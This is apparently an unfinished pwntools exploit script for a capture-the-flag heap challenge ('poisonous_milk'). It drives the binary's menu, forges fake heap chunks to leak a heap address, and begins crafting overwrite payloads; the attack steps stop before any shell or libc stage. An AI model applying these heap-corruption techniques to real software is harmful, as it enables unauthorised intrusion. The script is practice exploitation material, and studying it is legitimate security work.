from pwn import *
import time


# local process envirnoment
LOCAL = True
elf_name = "./poisonous_milk"
run_argv = [elf_name, "100"]

#retmote args
remote_host = "127.0.0.1"
remote_port = 22333

if LOCAL:
    elf = ELF(elf_name)
    #context.clear(arch="i386")
    context.clear(arch="amd64")
    context.log_level = "debug"
    mine_env = os.environ
    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(argv=run_argv, env=mine_env)
else:
    io = remote(remote_host, remote_port)

def mmenu(opt):
    io.recvuntil("> ")
    io.sendline(opt)

def put_milk(st_flags, color):
    mmenu('p')
    io.recvuntil("flags (0-99): ")
    io.send(st_flags)
    io.recvuntil("Input your milk's color: ")
    io.sendline(color)

def view_milk():
    mmenu('v')

def remove_milk(index):
    mmenu('r')
    io.recvuntil("Give the index : ")
    io.sendline(str(index))

def drink_milk():
    mmenu('d')

def quit_milk():
    mmenu('q')

def s_leak():
    put_milk("a"*0x08+"\n", "red")
    remove_milk(0)
    fake_chunk0 = p64(0x91).ljust(0x44, 'c') + '\n'
    put_milk(fake_chunk0, "none")
    view_milk()
    io.recvuntil("[0] [")
    lk_heap_addr = u64((io.recvuntil("]")[:-1].ljust(8, chr(0)))) - 0x78
    log.info("heap address: "+hex(lk_heap_addr))
    # leak libc
    '''
    remove_milk(0)
    payload = 2 * p64(lk_heap_addr+0xE0)
    payload += p64(lk_heap_addr+0x100)
    payload += p64(lk_heap_addr+0x110)
    payload += p64(lk_heap_addr+0x90) + p64(lk_heap_addr+0x100)
    payload += p64(lk_heap_addr+0x90) + p64(lk_heap_addr+0x100)
    payload = payload.ljust(0x50, chr(0)) + '\n'
    put_milk(payload, "red")
    '''
    raw_input("del?")
    drink_milk()
    payload = p64(lk_heap_addr+0x90) + p64(lk_heap_addr+0x98) + p64(lk_heap_addr+0xB0)[:-1]
    payload += payload.ljust(0x40, 'c') + '\n'
    put_milk(payload, "red")
    return lk_heap_addr

def s_exp():
    lk_data = s_leak()

if __name__ == "__main__":
    raw_input("start")
    s_exp()
    raw_input("end")
